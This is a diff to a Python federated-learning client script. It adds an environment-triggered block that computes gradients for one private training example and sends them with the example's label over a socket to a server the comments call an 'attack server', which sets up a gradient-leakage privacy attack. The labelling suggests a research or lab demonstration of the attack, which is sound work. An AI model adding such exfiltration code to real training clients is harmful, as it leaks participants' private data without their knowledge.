@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import sys, os, time
+import sys, os, time, pickle
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
 import argparse, socket, torch, torch.nn.functional as F
@@ -65,6 +65,38 @@ def main():
             except Exception as e:
                 print(f"[client] error receiving global weights: {e}. exiting.", flush=True)
                 return
+            if os.environ.get("LEAK_ONCE") == "1":
+                try:
+                    model = SmallCNN(pretrained=False)
+                    model.load_state_dict(state_dict)
+                    model.to(device).train()
+
+                    model.train()
+                    x, y = next(iter(loader))                # take ONE batch from this shard
+                    x0, y0 = x[:1].to(device), y[:1].to(device)
+                    model.zero_grad()
+                    logits = model(x0)
+                    loss = F.cross_entropy(logits, y0)
+                    grads = torch.autograd.grad(loss, model.parameters(), create_graph=False)
+
+                    # prepare payload: list of gradient tensors (CPU) + one label
+                    payload = {
+                        "grads": [g.detach().cpu() for g in grads],
+                        "label": int(y0[0].item()) if y0.ndim > 0 else int(y0.item())
+                    }
+                    data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
+
+                    # send to attack server on host:(port+1)
+                    atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    atk.connect((args.host, args.port + 1))
+                    atk.sendall(len(data).to_bytes(8, "big"))
+                    atk.sendall(data)
+                    atk.close()
+                    print("[client] leaked 1-batch gradient to attack server", flush=True)
+                except Exception as e:
+                    print(f"[client] leak failed: {e}", flush=True)
+                finally:
+                    os.environ["LEAK_ONCE"] = "0"
 
             print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)
 
